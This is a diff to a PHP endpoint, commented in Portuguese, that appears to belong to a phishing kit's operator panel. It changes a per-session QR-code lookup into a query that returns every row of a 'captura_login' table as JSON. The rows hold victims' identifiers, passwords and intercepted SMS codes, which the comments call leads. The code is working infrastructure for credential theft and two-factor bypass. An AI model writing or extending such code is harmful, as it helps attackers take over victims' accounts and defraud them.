@@ -1,35 +1,43 @@
 <?php
-// api_get_qrcode.php
+// Define que a resposta será no formato JSON
 header('Content-Type: application/json');
 
+// Inclui o arquivo de conexão com o banco de dados
 require 'db.php';
 
-// Se o cliente não tem o cookie de sessão, não há como encontrar seu QR Code.
-if (!isset($_COOKIE['identificador_cliente'])) {
-    echo json_encode(['success' => false, 'error' => 'Sessão não encontrada.']);
-    exit;
-}
-
-$session_id = $_COOKIE['identificador_cliente'];
-
 try {
-    // Busca o caminho do QR Code para a entrada mais recente desta sessão
+    // Prepara a consulta SQL para buscar todos os campos necessários de todos os registros.
+    // **Ajuste principal: Adicionamos a coluna 'sms_code' ao SELECT.**
+    // Ordenamos por 'id DESC' para que os leads mais recentes apareçam primeiro no painel.
     $stmt = $pdo->prepare(
-        "SELECT qrcode_path FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
+        "SELECT 
+            id, 
+            session_id, 
+            identificador, 
+            senha, 
+            sms_code, -- <<< CAMPO ADICIONADO
+            qrcode_path, 
+            status, 
+            data_criacao 
+        FROM 
+            captura_login 
+        ORDER BY 
+            id DESC"
     );
-    $stmt->execute([$session_id]);
-    $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
+    
+    // Executa a consulta
+    $stmt->execute();
 
-    // Se encontrou um registro e o caminho do QR Code não está vazio...
-    if ($resultado && !empty($resultado['qrcode_path'])) {
-        // ...retorna sucesso e o caminho para a imagem.
-        echo json_encode(['success' => true, 'qrcode_path' => $resultado['qrcode_path']]);
-    } else {
-        // ...caso contrário, informa que ainda está aguardando.
-        echo json_encode(['success' => false, 'error' => 'Aguardando QR Code.']);
-    }
+    // Busca todos os resultados em um array associativo
+    $capturas = $stmt->fetchAll(PDO::FETCH_ASSOC);
+
+    // Retorna o array de capturas como uma resposta JSON
+    echo json_encode($capturas);
 
 } catch (PDOException $e) {
-    echo json_encode(['success' => false, 'error' => 'Erro de banco de dados: ' . $e->getMessage()]);
+    // Em caso de erro com o banco de dados, retorna uma resposta de erro em JSON
+    // para que o painel de admin possa tratar o erro.
+    http_response_code(500); // Define o código de status HTTP para Erro de Servidor
+    echo json_encode(['success' => false, 'error' => 'Erro ao consultar o banco de dados: ' . $e->getMessage()]);
 }
 ?>
